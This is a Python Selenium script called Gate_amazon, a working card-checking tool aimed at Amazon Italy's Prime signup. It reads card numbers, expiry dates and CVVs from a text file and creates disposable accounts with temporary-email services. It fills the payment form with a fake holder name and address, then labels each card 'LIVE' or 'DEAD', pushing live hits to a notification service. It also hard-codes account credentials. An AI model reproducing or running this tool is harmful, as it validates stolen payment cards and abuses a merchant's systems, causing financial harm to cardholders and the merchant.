from logging import exception
from selenium import webdriver
from selenium.webdriver.common import by
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import *
from time import sleep, time
from notify_run import Notify
from colorama import *
from playsound import playsound
from string import ascii_letters
from random import choice, randint
import threading
import random
import names
import os
import sys

class Gate_amazon:

    def __init__(self, status):
        
        if status == True:
            try:
                init()
                #sys.tracebacklimit = 0     #Manejo de excepcioneswa
                now = time()
                #Cargando ccs
                self.load_cctxt()
                self.crearlinea()
                print(Fore.LIGHTBLUE_EX, 'Cargando CCs', Fore.WHITE)

                print(Fore.LIGHTBLUE_EX, 'Cargando Gate', Fore.WHITE)

                self.dominemail = ''
                self.webdriver_chromeoptions()
                #Temp page
                path = f'{os.path.dirname(os.path.realpath(__file__))}\chromedriver.exe'
                self.__browser221 = webdriver.Chrome(path, options=self.chrome_options)   #Crea la interfaz con las opciones
                
                #self.__browser221.get(f"https://tempm.com/{self.dominemail}") #Carga la web
                #self.tempmail()  #Extrae datos del mail

                
                self.__browser221.get('https://embedded.cryptogmail.com/')
                self.crypto_mail()

                #Amazon page
                self.__driver = webdriver.Chrome(path, options=self.chrome_options)   #Crea interfaz con las opciones
                self.__driver.get("https://www.amazon.it/gp/prime/pipeline/membersignup")  #Carga la web 
                error = self.registroamazon()    #Se registra en amazon
                #self.load_mailtxt()

                error = False
                try:
                    WebDriverWait(self.__driver, 120).until(EC.element_to_be_clickable((By.LINK_TEXT, 'Aggiungi una carta di credito o di debito')))
                except:
                    error = True

                if error == False:
                    self.__driver.delete_all_cookies()
                    self.__driver.find_element(By.ID, 'sp-cc-accept').click()
                    self.__driver.find_element(By.LINK_TEXT, 'Aggiungi una carta di credito o di debito').click()
                    sleep(2)
                    self.__driver.switch_to.frame(self.__driver.find_element_by_xpath(".//iframe[contains(@name,'ApxSecureIframe')]"))


                print(Fore.MAGENTA, 'Tiempo transcurrido: ', (time()-now)/60)

            except WebDriverException as ex:
                print(Fore.RED, ex.msg[14:])
        
        else:
            self.load_cctxt()
            self.crearlinea()

            self.webdriver_chromeoptions()
            path = f'{os.path.dirname(os.path.realpath(__file__))}\chromedriver.exe'
            self.__driver = webdriver.Chrome(path, options=self.chrome_options)
            self.__driver.get('https://www.amazon.it/gp/prime/pipeline/membersignup')
            self.__driver.find_element(By.ID, 'ap_email').send_keys('3132121716')
            self.__driver.find_element(By.ID, 'ap_password').send_keys('ColombiaSOS2021')
            self.__driver.find_element(By.ID, 'signInSubmit').click()
            
            #añadir cc
            error = False
            try:
                self.__driver.find_element(By.ID, 'sp-cc-accept').click()
            finally:
                self.__driver.find_element(By.LINK_TEXT, 'Aggiungi una carta di credito o di debito').click()
                sleep(2)
                self.__driver.switch_to.frame(self.__driver.find_element_by_xpath(".//iframe[contains(@name,'ApxSecureIframe')]"))

                self.fillcc1()
            
    def load_cctxt(self):
        self.ccs = open("cc.txt", "r+").readlines()        
        self.indice_ultima = len(self.ccs) - 1
        self.count_cc = self.indice_ultima

    def crearlinea(self):

        file = [s.rstrip() for s in self.ccs]
        self.cc = file[self.indice_ultima - self.count_cc].split("|")
        self.cc1 = self.cc[0]
        self.mes = self.cc[1] 
        self.anio = self.cc[2]
        self.cvv = self.cc[3]
        self.count_cc -= 1

    def webdriver_chromeoptions(self):
        #Inica el API WEBDRIVER CHROME para ajustar las opciones
        self.chrome_options = webdriver.ChromeOptions()
        
        # Agrega los opciones del navegador
        self.chrome_options.add_argument("--disable-extensions")
        self.chrome_options.add_argument("--disable-infobars")
        self.chrome_options.add_argument("--disable-popup-blocking")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument('--incognito')
        self.chrome_options.add_argument("--window-size=800,600")
        #self.chrome_options.add_argument("--headless")                  #Ocultar navegador
        self.chrome_options.add_argument('--no-sandbox')               #Only linux
        self.chrome_options.add_argument('--ignore-certificate-errors')
        self.chrome_options.add_argument('--disable-dev-shm-usage')

        #self.chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])

    def crypto_mail(self):

        print(Fore.WHITE,"CREATING EMAIL...", Fore.WHITE)                                   
        WebDriverWait(self.__browser221, 30).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div/div[1]/div/div[1]/div')))
        #self.__browser221.implicitly_wait(30)  #Espera 30 segundos o hasta que cargue
        sleep(1)
        self.__browser221.find_element_by_xpath("/html/body/div/div[1]/div/div[2]/a[3]").click()
        user = ''.join(choice(ascii_letters) + str(randint(0, 9)) for i in range(15))
        sleep(4)
        self.__browser221.find_element(By.XPATH, '//*[@id="_tm_changeEmail"]/div/div[2]/div/div/input').send_keys(user)
        self.__browser221.find_element(By.XPATH, '//*[@id="_tm_changeEmail"]/div/div[2]/div/a').click()

        WebDriverWait(self.__browser221, 15).until(EC.presence_of_element_located((By.XPATH, '//*[@id="_tm_changeEmail"]/div/div[2]/div/a')))
        mail = self.__browser221.find_element_by_xpath('/html/body/div/div[1]/div/div[1]/div')
        self.correitotemp = mail.text

    def tempmail(self):

        print(Fore.WHITE,"CREATING EMAIL...", Fore.WHITE)
        self.__browser221.implicitly_wait(30)  #Espera 30 segundos o hasta que cargue
        user = self.__browser221.find_element_by_id("userName")
        domain = self.__browser221.find_element_by_id('domainName2')
        user_value = user.get_attribute("value")
        domain_value = domain.get_attribute("value")
        self.correitotemp = user_value+"@"+domain_value

    def refill_register(self):
        self.__driver.find_element(By.NAME, 'email').clear()
        self.__driver.find_element(By.NAME, 'email').send_keys(self.correitotemp)
        self.__driver.find_element(By.NAME, 'password').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.NAME, 'passwordCheck').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.XPATH, '//*[@id="continue"]').click()

    def optcode_cryto(self):
                                                                                        #'.//iframe[contains(@name,'ApxSecureIframe')]
        WebDriverWait(self.__browser221, 30).until(EC.element_to_be_clickable((By.XPATH, ".//div[contains(@onclick, '_temp_mail.openEmail')]")))
        self.__browser221.find_element(By.XPATH, ".//div[contains(@onclick, '_temp_mail.openEmail')]").click()
        print("Abrio")
        WebDriverWait(self.__browser221, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'otp')))
        codiguito = self.__browser221.find_element_by_class_name("otp")
        print("Encontro otp")
        codiguito2 = codiguito.text
        print(codiguito)
        self.__driver.find_element(By.NAME, 'code').send_keys(codiguito2)
        self.__driver.find_element(By.CLASS_NAME, 'a-button-input').click()
        self.__browser221.quit()

    def otpcode_tempm(self):
        
        self.__browser221.refresh()
        codiguito = self.__browser221.find_element_by_class_name("otp")
        codiguito2 = codiguito.text
        self.__driver.find_element(By.NAME, 'code').send_keys(codiguito2)
        self.__driver.find_element(By.CLASS_NAME, 'a-button-input').click()
        self.__browser221.quit()

        '''WebDriverWait(self.__driver, 30).until(EC.presence_of_element_located((By.ID, "pp-nex5Ut-43")))
        self.__driver.find_element(By.ID, 'pp-nex5Ut-43').click()'''

    def load_mailtxt(self):
        print(Fore.CYAN +"SIGNING UP ACCOUNT ", Fore.WHITE)
        WebDriverWait(self.__driver, 30).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="createAccountSubmit"]')))
        #Click para registrarse
        self.__driver.find_element(By.XPATH, '//*[@id="createAccountSubmit"]').click()

        #Llena el formulario de registro
        self.__driver.find_element(By.NAME, 'customerName').send_keys(names.get_full_name())
        self.__driver.find_element(By.NAME, 'email').send_keys(self.correitotemp)
        self.__driver.find_element(By.NAME, 'password').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.NAME, 'passwordCheck').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.XPATH, '//*[@id="continue"]').click()

        #espera a que cargue la ventana de captcha
        self.__driver.implicitly_wait(10)
        i=0
        while True:
            bodyText0 = self.__driver.find_element_by_tag_name('body').text
            if "Errore interno. Riprova più tardi" in bodyText0:
                print(Fore.YELLOW + str(i) + " CHANGING EMAIL", Fore.WHITE)
                i+=1
                self.__browser221.get("https://tempm.com/email-generator") #Carga la web
                self.tempmail()  #Extrae datos del mail
                self.refill_register()
                error = True
            else:
                error = False
                break
        
        if error == False:
            print(Fore.GREEN, self.correitotemp, Fore.WHITE)
            mailtxt = open("dominemail.txt", "a")
            mailtxt.write(f"\n{self.correitotemp}")
            mailtxt.close()
            self.__driver.quit()
            self.__browser221.quit()

    def registroamazon(self):

        print(Fore.CYAN +"SIGNING UP ACCOUNT ", Fore.WHITE)
        WebDriverWait(self.__driver, 30).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="createAccountSubmit"]')))
        #Click para registrarse
        self.__driver.find_element(By.XPATH, '//*[@id="createAccountSubmit"]').click()

        #Llena el formulario de registro
        self.__driver.find_element(By.NAME, 'customerName').send_keys(names.get_full_name())
        self.__driver.find_element(By.NAME, 'email').send_keys(self.correitotemp)
        self.__driver.find_element(By.NAME, 'password').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.NAME, 'passwordCheck').send_keys("ColombiaSOS2021")
        self.__driver.find_element(By.XPATH, '//*[@id="continue"]').click()

        #espera a que cargue la ventana de captcha
        self.__driver.implicitly_wait(10)
        for i in range(3):
            bodyText0 = self.__driver.find_element_by_tag_name('body').text
            if "Errore interno. Riprova più tardi" in bodyText0:
                print(Fore.YELLOW + str(i) + " ERROR, CHANGING EMAIL", Fore.WHITE)
                i+=1
                #self.__browser221.get(f"https://tempm.com/email-generator")
                #self.tempmail()  #Extrae datos del mail
                
                self.__browser221.get('https://embedded.cryptogmail.com/')
                self.crypto_mail()
                self.refill_register()
                error = True
            else:
                error = False
                break

        if error == False:
            print(Fore.GREEN, self.correitotemp, Fore.WHITE)
            # Cambia el foco al iframe
            self.__driver.implicitly_wait(10)
            bodyText0 = self.__driver.find_element_by_tag_name('body').text
            if "Risolvi questo puzzle per proteggere il tuo account" in bodyText0:
                self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="cvf-arkose-frame"]'))     #Primer frame
                self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="fc-iframe-wrap"]'))       #Segundo frame
                self.__driver.switch_to.frame(self.__driver.find_element_by_xpath('//*[@id="CaptchaFrame"]'))         #Tercer frame
                # Ahora podemos hacer clic en el botón'
                self.__driver.find_element(By.XPATH, '//*[@id="home_children_button"]').click()
                self.__driver.switch_to.default_content()
                
                #Espera respuestas al aceptar el captcha
                try:
                    print(Fore.BLUE, 'WAITING TO THE USER SOLVE THE CAPTCHA', Fore.WHITE)
                    WebDriverWait(self.__driver, 150).until(EC.presence_of_element_located((By.ID, "cvf-input-code")))
                except:
                    error = True

                if error == False:
                    print(Fore.BLUE, 'WAITING OTP', Fore.WHITE)
                    try:
                        self.optcode_cryto()
                    except:
                        error = True

                    if error == False:
                        print(Fore.CYAN +"OTP SOLVED", Fore.WHITE)
                        return True                     
                    else:
                        print(Fore.RED, 'OTP ERROR')
                        return False

                else:
                    print(Fore.RED, 'Captcha no resuelto', Fore.WHITE)
            else:
                print(Fore.RED, 'Error al cargar el captcha')
        else:
            print(Fore.RED, 'Error al crear la cuenta (mail)', Fore.WHITE)

    def buttonsfill(self):
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:SelectAddressEvent').click()
        sleep(3)
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:PreferencePaymentOptionSelectionEvent').click()
        timer3 = threading.Timer(3, self.pagar)
        timer3.start()

    def refill(self):
        self.__driver.find_element(By.NAME, 'ppw-accountHolderName').send_keys("Pandorita Quintana")
        self.__driver.find_element(By.NAME, 'addCreditCardNumber').send_keys(self.cc1)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_month').send_keys(self.mes)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_year').send_keys(self.anio)
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:AddCreditCardEvent').click()
        timer5 = threading.Timer(3, self.buttonsfill)
        timer5.start()

    def recheck(self):
        sleep(2)                               
        self.__driver.find_element_by_xpath("/html/body/div[1]/div[2]/div[2]/div[4]/div[2]/div[2]/form/div/div/div/div[1]/div[2]/div/span[4]/input").click()
        sleep(2)
        self.__driver.find_element(By.LINK_TEXT, 'Aggiungi una carta di credito o di debito').click()
        sleep(2)
        self.__driver.switch_to.frame(self.__driver.find_element_by_xpath(".//iframe[contains(@name,'ApxSecureIframe')]"))

        timer4 = threading.Timer(2, self.refill)
        timer4.start()

    def verificar(self):
        print(Fore.BLUE, 'CHECKING...', Fore.WHITE)
        
        bodyText = self.__driver.find_element_by_tag_name('body').text
        if "Si è verificato un errore durante la convalida del metodo di pagamento. Aggiorna o aggiungi un nuovo metodo di pagamento e riprova." in bodyText:
            print(Fore.RED + " DEAD " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv )
            self.crearlinea()
            timer2 = threading.Timer(4, self.recheck)
            timer2.start()
        elif "You can now enjoy FREE delivery on millions of Prime eligible items, stream thousands of movies and TV episodes on Prime Video, get free in game content with Prime Gaming and more." in bodyText:
            
            self.__driver.quit()
            self.webdriver_chromeoptions()
            path = f'{os.path.dirname(os.path.realpath(__file__))}\chromedriver.exe'
            self.__driver = webdriver.Chrome(path, options=self.chrome_options)
            self.__driver.get('https://www.amazon.it/gp/prime/pipeline/membersignup')
            self.__driver.find_element(By.ID, 'ap_email').send_keys(self.correitotemp)
            self.__driver.find_element(By.ID, 'ap_password').send_keys('ColombiaSOS2021')
            self.__driver.find_element(By.ID, 'signInSubmit').click()
            
            ms = self.__driver.find_element(By.TAG_NAME, 'body').text
            if 'Account on hold temporarily' in ms:
                print(Fore.RED, 'Cuenta baneada')
            else:
                playsound('HIT.wav')
                print(Fore.GREEN + " LIVE " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv )
                notify = Notify()
                notify.send(" LIVE " + self.cc1 +"|"+ self.mes +"|"+self.anio +"|" + self.cvv) 
            
    def pagar(self):               
        
        print(Fore.BLUE, 'BUYING PRIME...', Fore.WHITE)
        try:
            sleep(2)
            self.__driver.switch_to.frame(self.__driver.find_element_by_xpath(".//iframe[contains(@name,'ApxSecureIframe')]"))
        except:
            pass
        finally:
            sleep(2)
            self.__driver.find_element(By.XPATH, '/html/body/div[1]/div[2]/div/div[4]/div[4]/div/div/div[1]/div/span/span/span').click()
            timer1 = threading.Timer(4, self.verificar)     
            timer1.start()

    def filladress(self):
        #DATA ADRESS AND PAY
        print(Fore.BLUE + "ADDING ADDRESS", Fore.WHITE)

        self.__driver.find_element(By.NAME, 'ppw-line1').send_keys("Via dei Monti Tiburtini, 623")
        self.__driver.find_element(By.NAME, 'ppw-city').send_keys("Roma")
        self.__driver.find_element(By.NAME, 'ppw-stateOrRegion').send_keys("Roma")
        self.__driver.find_element(By.NAME, 'ppw-postalCode').send_keys("Roma")
        self.__driver.find_element(By.NAME, 'ppw-phoneNumber').send_keys("064500210")
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:AddAddressEvent').click()
        
        sleep(2)
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:UseSuggestedAddressEvent').click()
        self.pagar()

    def fillcc1(self):
        #DATACC
        self.__driver.find_element(By.NAME, 'ppw-accountHolderName').send_keys("Pandorita Quintana")
        self.__driver.find_element(By.NAME, 'addCreditCardNumber').send_keys(self.cc1)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_month').send_keys(self.mes)
        self.__driver.find_element(By.NAME, 'ppw-expirationDate_year').send_keys(self.anio)
        self.__driver.find_element(By.NAME, 'ppw-widgetEvent:AddCreditCardEvent').click()
        print(Fore.BLUE +"ADDING CC", Fore.WHITE)
        timer7 = threading.Timer(3, self.filladress)
        timer7.start()



Start = Gate_amazon(False)
